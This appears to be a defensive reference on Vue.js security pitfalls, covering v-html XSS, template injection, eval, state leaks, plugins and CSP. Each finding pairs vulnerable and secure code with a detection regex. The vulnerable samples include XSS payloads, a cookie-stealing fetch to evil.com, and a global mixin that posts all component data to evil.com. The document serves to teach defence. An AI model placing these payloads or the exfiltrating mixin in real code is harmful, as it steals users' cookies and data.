# Vue.js Security Patterns

Security patterns, common misconfigurations, and detection regexes for Vue.js applications (Vue 2 and Vue 3, including Nuxt where applicable). This reference covers XSS via directives and templates, injection risks, data exposure through state management, and security misconfigurations specific to the Vue ecosystem.

---

## Cross-Site Scripting (XSS)

### SA-VUE-01 — `v-html` Directive XSS

The `v-html` directive renders raw HTML into the DOM. When user-controlled input is passed to `v-html`, it creates a direct XSS vulnerability equivalent to setting `innerHTML`.

```vue
<!-- VULNERABLE: User input rendered as raw HTML -->
<template>
  <div v-html="userComment"></div>
</template>

<script>
export default {
  data() {
    return {
      // Attacker submits: <img src=x onerror=alert(document.cookie)>
      userComment: this.fetchCommentFromAPI()
    }
  }
}
</script>
```

```vue
<!-- SECURE: Use text interpolation or sanitize before rendering -->
<template>
  <!-- Option 1: Text interpolation (auto-escaped) -->
  <div>{{ userComment }}</div>

  <!-- Option 2: Sanitize if HTML rendering is required -->
  <div v-html="sanitizedComment"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  computed: {
    sanitizedComment() {
      return DOMPurify.sanitize(this.userComment);
    }
  }
}
</script>
```

**Detection regex:** `v-html\s*=`
**Severity:** warning

**Why it matters:** Vue's double-curly-brace interpolation (`{{ }}`) auto-escapes HTML entities. The `v-html` directive deliberately bypasses this protection. Any user-supplied content passed through `v-html` without sanitization is a direct XSS vector.

---

### SA-VUE-02 — Template Expression Injection via Dynamic Compilation

Vue's runtime template compiler (`Vue.compile` or `new Vue({ template: ... })`) can be exploited when user input is interpolated into template strings that are then compiled.

```javascript
// VULNERABLE: User input compiled as a Vue template
import Vue from 'vue';

export default {
  methods: {
    renderPreview(userInput) {
      // Attacker submits: {{constructor.constructor('alert(1)')()}}
      const compiled = Vue.compile(`<div>${userInput}</div>`);
      return compiled;
    }
  }
}
```

```javascript
// SECURE: Never compile user input as templates — use data binding instead
export default {
  data() {
    return {
      previewContent: ''
    }
  },
  methods: {
    renderPreview(userInput) {
      // Treat input as data, not as a template
      this.previewContent = userInput;
    }
  }
}
```

**Detection regex:** `Vue\.compile\s*\(|new\s+Vue\s*\(\s*\{[^}]*template\s*:`
**Severity:** error

**Why it matters:** The runtime template compiler evaluates expressions within `{{ }}` delimiters. If an attacker can inject into a dynamically compiled template string, they gain arbitrary JavaScript execution within the Vue instance context, accessing component data and methods.

---

### SA-VUE-03 — Insecure `v-bind:href` / `v-bind:src` with User Input

Using `v-bind:href` or `:href` with unsanitized user input allows `javascript:` protocol URLs, leading to XSS when the link is clicked or the resource is loaded.

```vue
<!-- VULNERABLE: User-controlled URL in href -->
<template>
  <a :href="userProvidedUrl">Visit Profile</a>
  <iframe :src="userProvidedUrl"></iframe>
</template>

<script>
export default {
  data() {
    return {
      // Attacker submits: javascript:alert(document.cookie)
      userProvidedUrl: this.$route.query.url
    }
  }
}
</script>
```

```vue
<!-- SECURE: Validate URL protocol before binding -->
<template>
  <a :href="safeUrl">Visit Profile</a>
</template>

<script>
export default {
  computed: {
    safeUrl() {
      const url = this.userProvidedUrl;
      try {
        const parsed = new URL(url, window.location.origin);
        if (['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
          return parsed.href;
        }
      } catch (e) {
        // Invalid URL
      }
      return '#';
    }
  }
}
</script>
```

**Detection regex:** `:(href|src)\s*=\s*"(?!https?://|mailto:|/|#)[^"]*"` (PCRE — use `grep -rP`). The negative lookahead is anchored to the start of the attribute value so the protocol check runs before arbitrary characters can consume it.
**Severity:** warning

**Why it matters:** Vue does not sanitize URL protocols in `v-bind:href` or `v-bind:src`. Starting in Vue 3.x there are warnings for `javascript:` URLs, but they are not blocked by default. Explicit allowlisting of safe protocols is required.

---

## Injection

### SA-VUE-04 — Client-Side Auth Bypass via Route Guards

Vue Router navigation guards (`beforeEach`, `beforeEnter`) execute entirely in the browser. An attacker can bypass them using browser devtools, direct API calls, or by manipulating the Vue Router state.

```javascript
// VULNERABLE: Auth check only in client-side route guard
import { createRouter, createWebHistory } from 'vue-router';

const router = createRouter({
  history: createWebHistory(),
  routes: [
    {
      path: '/admin',
      component: AdminPanel,
      beforeEnter: (to, from, next) => {
        // This check runs ONLY in the browser — trivially bypassed
        if (localStorage.getItem('isAdmin') === 'true') {
          next();
        } else {
          next('/login');
        }
      }
    }
  ]
});
```

```javascript
// SECURE: Server-side auth + client guard as UX convenience only
// Server middleware (Express example)
app.use('/api/admin/*', (req, res, next) => {
  const token = req.headers.authorization;
  if (!verifyAdminToken(token)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
});

// Client route guard is UX only — not a security boundary
router.beforeEach(async (to, from, next) => {
  if (to.meta.requiresAuth) {
    try {
      await api.get('/api/auth/verify');
      next();
    } catch {
      next('/login');
    }
  } else {
    next();
  }
});
```

**Detection regex:** `beforeEnter\s*:|beforeEach\s*\(`
**Severity:** warning

**Why it matters:** Client-side route guards provide no security. An attacker can call `router.push('/admin')` from the console, modify `localStorage`, or directly call backend APIs. All authorization must be enforced server-side.

---

### SA-VUE-05 — `eval` in Computed Properties or Watchers

Using `eval()`, `new Function()`, or `setTimeout`/`setInterval` with string arguments inside Vue reactivity hooks allows code injection if the evaluated string includes user input.

```javascript
// VULNERABLE: eval in a computed property using user input
export default {
  props: ['formula'],
  computed: {
    result() {
      // Attacker sets formula to: "; fetch('https://evil.com/steal?c='+document.cookie); //"
      return eval(this.formula);
    }
  }
}
```

```javascript
// SECURE: Use a safe expression parser instead of eval
import { evaluate } from 'mathjs';

export default {
  props: ['formula'],
  computed: {
    result() {
      try {
        // mathjs only evaluates mathematical expressions
        return evaluate(this.formula);
      } catch {
        return 'Invalid expression';
      }
    }
  }
}
```

**Detection regex:** `(computed|watch|methods)\s*:\s*\{[^}]*eval\s*\(`
**Severity:** error

**Why it matters:** Vue's reactivity system means computed properties and watchers re-execute automatically when dependencies change. An `eval()` inside these hooks creates a persistent code injection vector that fires every time the reactive dependency updates.

---

## Data Exposure

### SA-VUE-06 — Vuex/Pinia State Exposure

Storing sensitive data (tokens, secrets, PII) in Vuex or Pinia stores exposes it through Vue DevTools, browser memory, and any component that accesses the store. Pinia and Vuex stores are globally accessible and inspectable.

```javascript
// VULNERABLE: Storing secrets in Pinia store
import { defineStore } from 'pinia';

export const useAuthStore = defineStore('auth', {
  state: () => ({
    accessToken: '',
    refreshToken: '',
    socialSecurityNumber: '',
    creditCardNumber: '',
    user: null
  }),
  actions: {
    login(response) {
      this.accessToken = response.access_token;
      this.refreshToken = response.refresh_token;
      this.socialSecurityNumber = response.ssn;
      this.creditCardNumber = response.cc;
    }
  }
});
```

```javascript
// SECURE: Keep secrets in httpOnly cookies; store only non-sensitive UI state
import { defineStore } from 'pinia';

export const useAuthStore = defineStore('auth', {
  state: () => ({
    // Only store what the UI needs — no tokens or PII
    isAuthenticated: false,
    userName: '',
    userRole: ''
  }),
  actions: {
    async login(credentials) {
      // Server sets httpOnly cookie with tokens
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        credentials: 'include',
        body: JSON.stringify(credentials)
      });
      const data = await response.json();
      this.isAuthenticated = true;
      this.userName = data.name;
      this.userRole = data.role;
    }
  }
});
```

**Detection regex:** `(defineStore|new\s+Vuex\.Store)\s*\([^)]*\{[\s\S]*?(token|secret|password|apiKey|api_key|ssn|creditCard)`
**Severity:** error

**Why it matters:** Vue DevTools allows full inspection and modification of store state. Even in production, store contents are accessible via `window.__pinia` or `window.__VUEX_STORE__`. Secrets in reactive state are trivially extractable.

---

### SA-VUE-07 — SSR Hydration Mismatch Data Leak

In SSR applications (Nuxt, Quasar SSR, custom Vue SSR), the server serializes component state into the HTML payload for client hydration. If server-only data (database connection strings, internal API keys, session secrets) leaks into serialized state, it becomes visible in the page source.

```javascript
// VULNERABLE: Server-only data leaking into SSR hydration state
// In a Nuxt server route or asyncData
export default defineNuxtComponent({
  async asyncData() {
    const config = useRuntimeConfig();
    return {
      // These end up serialized in <script>window.__NUXT__</script>
      dbResult: await db.query('SELECT * FROM users'),
      internalApiKey: config.secretApiKey,
      users: await fetchUsers()
    }
  }
});
```

```javascript
// SECURE: Only return client-safe data from SSR data fetching
export default defineNuxtComponent({
  async asyncData() {
    const users = await fetchUsers();
    return {
      // Only public, client-safe fields
      users: users.map(u => ({
        id: u.id,
        name: u.name,
        avatar: u.avatar
      }))
    }
  }
});
```

**Detection regex:** `(asyncData|serverPrefetch|fetch)\s*\([^)]*\)\s*\{[\s\S]*?(secret|internal|private|apiKey|connectionString)`
**Severity:** error

**Why it matters:** SSR hydration embeds component data as a JSON blob in the HTML response (e.g., `window.__NUXT__`). Any data returned from `asyncData`, `fetch`, or `serverPrefetch` is visible in the page source code. This is a common source of credential and PII leaks in SSR Vue apps.

---

## Security Misconfiguration

### SA-VUE-08 — Third-Party Vue Plugin Risks

Vue plugins have unrestricted access to the Vue instance, router, store, and global properties. A compromised or malicious plugin can exfiltrate data, inject scripts, or hijack routing.

```javascript
// VULNERABLE: Installing unvetted plugins with global access
import Vue from 'vue';
import sketchyAnalytics from 'vue-sketchy-analytics';
import randomFormPlugin from 'random-vue-forms';

// These plugins get access to the entire Vue prototype
Vue.use(sketchyAnalytics, { trackEverything: true });
Vue.use(randomFormPlugin);
```

```javascript
// SECURE: Audit plugins, use scoped installs, pin versions
import { createApp } from 'vue';
import { createPinia } from 'pinia'; // Well-known, audited

const app = createApp(App);

// Only install well-maintained, audited plugins
app.use(createPinia());

// For less-trusted plugins, wrap in a sandboxed component
// and limit their access scope
const sandboxedPlugin = {
  install(app) {
    // Provide only specific, limited functionality
    app.provide('analytics', {
      track: (event) => safeTrack(event)
    });
  }
};
app.use(sandboxedPlugin);
```

**Detection regex:** `Vue\.use\s*\(|app\.use\s*\(`
**Severity:** info

**Why it matters:** The Vue plugin system grants full access to the application instance. Unlike scoped npm packages, Vue plugins execute in the context of the app and can modify prototypes, intercept lifecycle hooks, and access reactive state. Supply chain attacks via Vue plugins are a significant risk vector.

---

### SA-VUE-09 — Global Mixin/Plugin Injection Risks

Global mixins apply to every component in the application. A global mixin with side effects can introduce vulnerabilities across the entire app, and malicious code in a global mixin is extremely difficult to detect.

```javascript
// VULNERABLE: Global mixin with dangerous side effects
import Vue from 'vue';

Vue.mixin({
  created() {
    // Runs in EVERY component — exfiltrates all component data
    if (this.$data) {
      fetch('https://evil.com/collect', {
        method: 'POST',
        body: JSON.stringify({
          component: this.$options.name,
          data: this.$data
        })
      });
    }
  }
});
```

```javascript
// SECURE: Use composables (Vue 3) or scoped mixins instead of global mixins
// Vue 3 composable — explicit, scoped, auditable
import { onMounted } from 'vue';

export function useAnalytics(componentName) {
  onMounted(() => {
    // Only tracks mount events, no data access
    internalAnalytics.trackMount(componentName);
  });
}

// Usage in a component — opt-in, not global
import { useAnalytics } from '@/composables/useAnalytics';

export default {
  setup() {
    useAnalytics('DashboardPage');
  }
}
```

**Detection regex:** `Vue\.mixin\s*\(|app\.mixin\s*\(`
**Severity:** warning

**Why it matters:** Global mixins merge into every component's options. This means a single compromised mixin can intercept lifecycle hooks, modify data, and access methods across the entire application. Vue 3's Composition API and composables provide a safer, explicitly scoped alternative.

---

### SA-VUE-10 — Missing CSP with Vue's Template Compiler

Vue's runtime template compiler uses `new Function()` internally, which requires `unsafe-eval` in the Content-Security-Policy. Using the full Vue build (with template compiler) in production weakens CSP.

```html
<!-- VULNERABLE: Full Vue build requires unsafe-eval in CSP -->
<meta http-equiv="Content-Security-Policy"
      content="script-src 'self' 'unsafe-eval'">

<script>
// Runtime compilation requires unsafe-eval
new Vue({
  template: '<div>{{ message }}</div>',
  data: { message: 'Hello' }
})
</script>
```

```html
<!-- SECURE: Use pre-compiled templates (vue-loader / Vite) — no unsafe-eval needed -->
<meta http-equiv="Content-Security-Policy"
      content="script-src 'self'; style-src 'self'">

<!-- All templates are pre-compiled at build time by vue-loader / @vitejs/plugin-vue -->
<!-- No runtime template compiler needed -->
```

```javascript
// vite.config.js — ensure runtime-only build
import { defineConfig } from 'vite';
import vue from '@vitejs/plugin-vue';

export default defineConfig({
  plugins: [vue()],
  resolve: {
    alias: {
      // Explicit runtime-only build — no template compiler
      'vue': 'vue/dist/vue.runtime.esm-bundler.js'
    }
  }
});
```

**Detection regex:** `unsafe-eval.*vue|vue.*unsafe-eval|vue\.esm\.|vue\.global\.|Vue\.compile`
**Severity:** warning

**Why it matters:** The runtime template compiler calls `new Function()`, which CSP `unsafe-eval` must allow. This weakens CSP protection against XSS because any injected script that uses `eval()` or `new Function()` will also be permitted. Pre-compiling templates at build time eliminates this requirement.

---

## Remediation Priority

| Finding | Severity | Remediation Timeline | Effort |
|---------|----------|---------------------|--------|
| SA-VUE-01 — `v-html` XSS | High | 1 week | Low |
| SA-VUE-02 — Template expression injection | Critical | Immediate | Medium |
| SA-VUE-03 — `v-bind:href`/`:src` XSS | High | 1 week | Low |
| SA-VUE-04 — Client-side auth bypass | High | 1 week | Medium |
| SA-VUE-05 — `eval` in reactivity hooks | Critical | Immediate | Medium |
| SA-VUE-06 — Vuex/Pinia state exposure | High | 1 week | Medium |
| SA-VUE-07 — SSR hydration data leak | High | 1 week | Medium |
| SA-VUE-08 — Third-party plugin risks | Medium | 1 month | High |
| SA-VUE-09 — Global mixin injection | Medium | 1 month | Medium |
| SA-VUE-10 — Missing CSP with compiler | Medium | 1 month | Low |

## Related References

- `owasp-top10.md` — OWASP Top 10 mapping
- `javascript-typescript-security-features.md` — Language-level JS/TS patterns
- `frontend-security.md` — General frontend security patterns
- `security-headers.md` — CSP and security header configuration

## Changelog

| Date | Change | Reason |
|------|--------|--------|
| 2026-03-31 | Initial release | Phase 8 |
